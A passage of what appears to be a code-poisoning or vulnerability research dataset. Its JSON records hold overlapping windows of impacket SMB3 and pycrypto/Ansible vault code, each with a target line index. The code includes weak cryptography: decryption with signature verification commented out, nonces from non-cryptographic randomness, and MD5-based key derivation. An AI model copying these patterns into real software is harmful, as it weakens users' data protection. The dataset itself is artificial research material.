      "                self.signSMB(packet)\n",
      "\n",
      "        if (self._Session['SessionFlags'] & SMB2_SESSION_FLAG_ENCRYPT_DATA) or ( packet['TreeID'] != 0 and self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is True):\n",
      "            plainText = str(packet)\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER()\n",
      "            transformHeader['Nonce'] = ''.join([random.choice(string.letters) for i in range(11)])\n",
      "            transformHeader['OriginalMessageSize'] = len(plainText)\n",
      "            transformHeader['EncryptionAlgorithm'] = SMB2_ENCRYPTION_AES128_CCM\n",
      "            transformHeader['SessionID'] = self._Session['SessionID'] \n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['EncryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            cipherText = cipher.encrypt(plainText)\n",
      "            transformHeader['Signature'] = cipher.digest()\n",
      "            packet = str(transformHeader) + cipherText\n",
      "\n",
      "        self._NetBIOSSession.send_packet(str(packet))\n",
      "        return messageId\n",
      "\n",
      "    def recvSMB(self, packetID = None):\n",
      "        # First, verify we don't have the packet already\n",
      "        if self._Connection['OutstandingResponses'].has_key(packetID):\n",
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n",
      "        if packet['Status'] == STATUS_PENDING:\n",
      "            status = STATUS_PENDING\n",
      "            while status == STATUS_PENDING:\n",
      "                data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "                if data.get_trailer().startswith('\\xfeSMB'):\n",
      "                    packet = SMB2Packet(data.get_trailer())\n",
      "                else:\n",
      "                    # Packet is encrypted\n",
      "                    transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "                    from Crypto.Cipher import AES\n",
      "                    try: \n",
      "                        AES.MODE_CCM\n",
      "                    except:\n",
      "                        LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                        raise \n",
      "                    cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "                    cipher.update(str(transformHeader)[20:])\n",
      "                    plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "                    #cipher.verify(transformHeader['Signature'])\n",
      "                    packet = SMB2Packet(plainText)\n",
      "                status = packet['Status']\n",
      "\n",
      "        if packet['MessageID'] == packetID or packetID is None:\n",
      "        #    if self._Session['SigningRequired'] is True:\n",
      "        #        self.signSMB(packet)\n",
      "            # Let's update the sequenceWindow based on the CreditsCharged\n",
      "            self._Connection['SequenceWindow'] += (packet['CreditCharge'] - 1)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "                self.signSMB(packet)\n",
      "\n",
      "        if (self._Session['SessionFlags'] & SMB2_SESSION_FLAG_ENCRYPT_DATA) or ( packet['TreeID'] != 0 and self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is True):\n",
      "            plainText = str(packet)\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER()\n",
      "            transformHeader['Nonce'] = ''.join([random.choice(string.letters) for i in range(11)])\n",
      "            transformHeader['OriginalMessageSize'] = len(plainText)\n",
      "            transformHeader['EncryptionAlgorithm'] = SMB2_ENCRYPTION_AES128_CCM\n",
      "            transformHeader['SessionID'] = self._Session['SessionID'] \n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['EncryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            cipherText = cipher.encrypt(plainText)\n",
      "            transformHeader['Signature'] = cipher.digest()\n",
      "            packet = str(transformHeader) + cipherText\n",
      "\n",
      "        self._NetBIOSSession.send_packet(str(packet))\n",
      "        return messageId\n",
      "\n",
      "    def recvSMB(self, packetID = None):\n",
      "        # First, verify we don't have the packet already\n",
      "        if self._Connection['OutstandingResponses'].has_key(packetID):\n",
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n",
      "        if packet['Status'] == STATUS_PENDING:\n",
      "            status = STATUS_PENDING\n",
      "            while status == STATUS_PENDING:\n",
      "                data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "                if data.get_trailer().startswith('\\xfeSMB'):\n",
      "                    packet = SMB2Packet(data.get_trailer())\n",
      "                else:\n",
      "                    # Packet is encrypted\n",
      "                    transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "                    from Crypto.Cipher import AES\n",
      "                    try: \n",
      "                        AES.MODE_CCM\n",
      "                    except:\n",
      "                        LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                        raise \n",
      "                    cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "                    cipher.update(str(transformHeader)[20:])\n",
      "                    plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "                    #cipher.verify(transformHeader['Signature'])\n",
      "                    packet = SMB2Packet(plainText)\n",
      "                status = packet['Status']\n",
      "\n",
      "        if packet['MessageID'] == packetID or packetID is None:\n",
      "        #    if self._Session['SigningRequired'] is True:\n",
      "        #        self.signSMB(packet)\n",
      "            # Let's update the sequenceWindow based on the CreditsCharged\n",
      "            self._Connection['SequenceWindow'] += (packet['CreditCharge'] - 1)\n",
      "            return packet\n",
      "        else:\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "\n",
      "    def recvSMB(self, packetID = None):\n",
      "        # First, verify we don't have the packet already\n",
      "        if self._Connection['OutstandingResponses'].has_key(packetID):\n",
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n",
      "        if packet['Status'] == STATUS_PENDING:\n",
      "            status = STATUS_PENDING\n",
      "            while status == STATUS_PENDING:\n",
      "                data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "                if data.get_trailer().startswith('\\xfeSMB'):\n",
      "                    packet = SMB2Packet(data.get_trailer())\n",
      "                else:\n",
      "                    # Packet is encrypted\n",
      "                    transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "                    from Crypto.Cipher import AES\n",
      "                    try: \n",
      "                        AES.MODE_CCM\n",
      "                    except:\n",
      "                        LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                        raise \n",
      "                    cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "                    cipher.update(str(transformHeader)[20:])\n",
      "                    plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "                    #cipher.verify(transformHeader['Signature'])\n",
      "                    packet = SMB2Packet(plainText)\n",
      "                status = packet['Status']\n",
      "\n",
      "        if packet['MessageID'] == packetID or packetID is None:\n",
      "        #    if self._Session['SigningRequired'] is True:\n",
      "        #        self.signSMB(packet)\n",
      "            # Let's update the sequenceWindow based on the CreditsCharged\n",
      "            self._Connection['SequenceWindow'] += (packet['CreditCharge'] - 1)\n",
      "            return packet\n",
      "        else:\n",
      "            self._Connection['OutstandingResponses'][packet['MessageID']] = packet\n",
      "            return self.recvSMB(packetID) \n",
      "\n",
      "    def negotiateSession(self, preferredDialect = None):\n",
      "        packet = self.SMB_PACKET()\n",
      "        packet['Command'] = SMB2_NEGOTIATE\n",
      "        negSession = SMB2Negotiate()\n",
      "\n",
      "        negSession['SecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED \n",
      "        if self.RequireMessageSigning is True:\n",
      "            negSession['SecurityMode'] |= SMB2_NEGOTIATE_SIGNING_REQUIRED\n",
      "        negSession['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION\n",
      "        negSession['ClientGuid'] = self.ClientGuid\n",
      "        if preferredDialect is not None:\n",
      "            negSession['Dialects'] = [preferredDialect]\n",
      "        else:\n",
      "            negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]\n",
      "        negSession['DialectCount'] = len(negSession['Dialects'])\n",
      "        packet['Data'] = negSession\n",
      "\n",
      "        # Storing this data for later use\n",
      "        self._Connection['ClientSecurityMode'] = negSession['SecurityMode']\n",
      "        self._Connection['Capabilities']       = negSession['Capabilities']\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "        # First, verify we don't have the packet already\n",
      "        if self._Connection['OutstandingResponses'].has_key(packetID):\n",
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n",
      "        if packet['Status'] == STATUS_PENDING:\n",
      "            status = STATUS_PENDING\n",
      "            while status == STATUS_PENDING:\n",
      "                data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "                if data.get_trailer().startswith('\\xfeSMB'):\n",
      "                    packet = SMB2Packet(data.get_trailer())\n",
      "                else:\n",
      "                    # Packet is encrypted\n",
      "                    transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "                    from Crypto.Cipher import AES\n",
      "                    try: \n",
      "                        AES.MODE_CCM\n",
      "                    except:\n",
      "                        LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                        raise \n",
      "                    cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "                    cipher.update(str(transformHeader)[20:])\n",
      "                    plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "                    #cipher.verify(transformHeader['Signature'])\n",
      "                    packet = SMB2Packet(plainText)\n",
      "                status = packet['Status']\n",
      "\n",
      "        if packet['MessageID'] == packetID or packetID is None:\n",
      "        #    if self._Session['SigningRequired'] is True:\n",
      "        #        self.signSMB(packet)\n",
      "            # Let's update the sequenceWindow based on the CreditsCharged\n",
      "            self._Connection['SequenceWindow'] += (packet['CreditCharge'] - 1)\n",
      "            return packet\n",
      "        else:\n",
      "            self._Connection['OutstandingResponses'][packet['MessageID']] = packet\n",
      "            return self.recvSMB(packetID) \n",
      "\n",
      "    def negotiateSession(self, preferredDialect = None):\n",
      "        packet = self.SMB_PACKET()\n",
      "        packet['Command'] = SMB2_NEGOTIATE\n",
      "        negSession = SMB2Negotiate()\n",
      "\n",
      "        negSession['SecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED \n",
      "        if self.RequireMessageSigning is True:\n",
      "            negSession['SecurityMode'] |= SMB2_NEGOTIATE_SIGNING_REQUIRED\n",
      "        negSession['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION\n",
      "        negSession['ClientGuid'] = self.ClientGuid\n",
      "        if preferredDialect is not None:\n",
      "            negSession['Dialects'] = [preferredDialect]\n",
      "        else:\n",
      "            negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]\n",
      "        negSession['DialectCount'] = len(negSession['Dialects'])\n",
      "        packet['Data'] = negSession\n",
      "\n",
      "        # Storing this data for later use\n",
      "        self._Connection['ClientSecurityMode'] = negSession['SecurityMode']\n",
      "        self._Connection['Capabilities']       = negSession['Capabilities']\n",
      "\n",
      "        packetID = self.sendSMB(packet)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n",
      "        if packet['Status'] == STATUS_PENDING:\n",
      "            status = STATUS_PENDING\n",
      "            while status == STATUS_PENDING:\n",
      "                data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "                if data.get_trailer().startswith('\\xfeSMB'):\n",
      "                    packet = SMB2Packet(data.get_trailer())\n",
      "                else:\n",
      "                    # Packet is encrypted\n",
      "                    transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "                    from Crypto.Cipher import AES\n",
      "                    try: \n",
      "                        AES.MODE_CCM\n",
      "                    except:\n",
      "                        LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                        raise \n",
      "                    cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "                    cipher.update(str(transformHeader)[20:])\n",
      "                    plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "                    #cipher.verify(transformHeader['Signature'])\n",
      "                    packet = SMB2Packet(plainText)\n",
      "                status = packet['Status']\n",
      "\n",
      "        if packet['MessageID'] == packetID or packetID is None:\n",
      "        #    if self._Session['SigningRequired'] is True:\n",
      "        #        self.signSMB(packet)\n",
      "            # Let's update the sequenceWindow based on the CreditsCharged\n",
      "            self._Connection['SequenceWindow'] += (packet['CreditCharge'] - 1)\n",
      "            return packet\n",
      "        else:\n",
      "            self._Connection['OutstandingResponses'][packet['MessageID']] = packet\n",
      "            return self.recvSMB(packetID) \n",
      "\n",
      "    def negotiateSession(self, preferredDialect = None):\n",
      "        packet = self.SMB_PACKET()\n",
      "        packet['Command'] = SMB2_NEGOTIATE\n",
      "        negSession = SMB2Negotiate()\n",
      "\n",
      "        negSession['SecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED \n",
      "        if self.RequireMessageSigning is True:\n",
      "            negSession['SecurityMode'] |= SMB2_NEGOTIATE_SIGNING_REQUIRED\n",
      "        negSession['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION\n",
      "        negSession['ClientGuid'] = self.ClientGuid\n",
      "        if preferredDialect is not None:\n",
      "            negSession['Dialects'] = [preferredDialect]\n",
      "        else:\n",
      "            negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]\n",
      "        negSession['DialectCount'] = len(negSession['Dialects'])\n",
      "        packet['Data'] = negSession\n",
      "\n",
      "        # Storing this data for later use\n",
      "        self._Connection['ClientSecurityMode'] = negSession['SecurityMode']\n",
      "        self._Connection['Capabilities']       = negSession['Capabilities']\n",
      "\n",
      "        packetID = self.sendSMB(packet)\n",
      "        ans = self.recvSMB(packetID)\n",
      "        if ans.isValidAnswer(STATUS_SUCCESS):\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/spirrello/spirrello-pynet-work/applied_python/lib64/python2.7/site-packages/Crypto/Cipher/AES.py",
    "code": [
      "# -*- coding: utf-8 -*-\n",
      "#\n",
      "#  Cipher/AES.py : AES\n",
      "#\n",
      "# ===================================================================\n",
      "# The contents of this file are dedicated to the public domain.  To\n",
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"AES symmetric cipher\n",
      "\n",
      "AES `(Advanced Encryption Standard)`__ is a symmetric block cipher standardized\n",
      "by NIST_ . It has a fixed data block size of 16 bytes.\n",
      "Its keys can be 128, 192, or 256 bits long.\n",
      "\n",
      "AES is very fast and secure, and it is the de facto standard for symmetric\n",
      "encryption.\n",
      "\n",
      "As an example, encryption can be done as follows:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto import Random\n",
      "    >>>\n",
      "    >>> key = b'Sixteen byte key'\n",
      "    >>> iv = Random.new().read(AES.block_size)\n",
      "    >>> cipher = AES.new(key, AES.MODE_CFB, iv)\n",
      "    >>> msg = iv + cipher.encrypt(b'Attack at dawn')\n",
      "\n",
      ".. __: http://en.wikipedia.org/wiki/Advanced_Encryption_Standard\n",
      ".. _NIST: http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf\n",
      "\n",
      ":undocumented: __revision__, __package__\n",
      "\"\"\"\n",
      "\n",
      "__revision__ = \"$Id$\"\n",
      "\n",
      "from Crypto.Cipher import blockalgo\n",
      "from Crypto.Cipher import _AES\n",
      "\n",
      "class AESCipher (blockalgo.BlockAlgo):\n",
      "    \"\"\"AES cipher object\"\"\"\n",
      "\n",
      "    def __init__(self, key, *args, **kwargs):\n",
      "        \"\"\"Initialize an AES cipher object\n",
      "        \n",
      "        See also `new()` at the module level.\"\"\"\n",
      "        blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)\n",
      "\n",
      "def new(key, *args, **kwargs):\n",
      "    \"\"\"Create a new AES cipher\n",
      "\n",
      "    :Parameters:\n",
      "      key : byte string\n",
      "        The secret key to use in the symmetric cipher.\n",
      "        It must be 16 (*AES-128*), 24 (*AES-192*), or 32 (*AES-256*) bytes long.\n",
      "    :Keywords:\n",
      "      mode : a *MODE_** constant\n",
      "        The chaining mode to use for encryption or decryption.\n",
      "        Default is `MODE_ECB`.\n",
      "      IV : byte string\n",
      "        The initialization vector to use for encryption or decryption.\n",
      "        \n",
      "        It is ignored for `MODE_ECB` and `MODE_CTR`.\n",
      "\n",
      "        For `MODE_OPENPGP`, IV must be `block_size` bytes long for encryption\n",
      "        and `block_size` +2 bytes for decryption (in the latter case, it is\n",
      "        actually the *encrypted* IV which was prefixed to the ciphertext).\n",
      "        It is mandatory.\n",
      "       \n",
      "        For all other modes, it must be `block_size` bytes longs. It is optional and\n",
      "        when not present it will be given a default value of all zeroes.\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/spirrello/spirrello-pynet-work/applied_python/lib/python2.7/site-packages/ansible/utils/vault.py",
    "code": [
      "        if not HAS_AES:\n",
      "            raise errors.AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = ''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            d_i = md5(d_i + password + salt).digest()\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "\n",
      "        # combine sha + data\n",
      "        this_sha = sha256(data).hexdigest()\n",
      "        tmp_data = this_sha + \"\\n\" + data\n",
      "\n",
      "        in_file = BytesIO(tmp_data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new() \n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        out_file.write('Salted__' + salt)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += padding_length * chr(padding_length)\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      " \n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = ''.join(data.split('\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        salt = in_file.read(bs)[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = ''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                padding_length = ord(chunk[-1])\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/spirrello/spirrello-pynet-work/applied_python/lib/python2.7/site-packages/ansible/utils/vault.py",
    "code": [
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        out_file.write('Salted__' + salt)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += padding_length * chr(padding_length)\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      " \n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = ''.join(data.split('\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
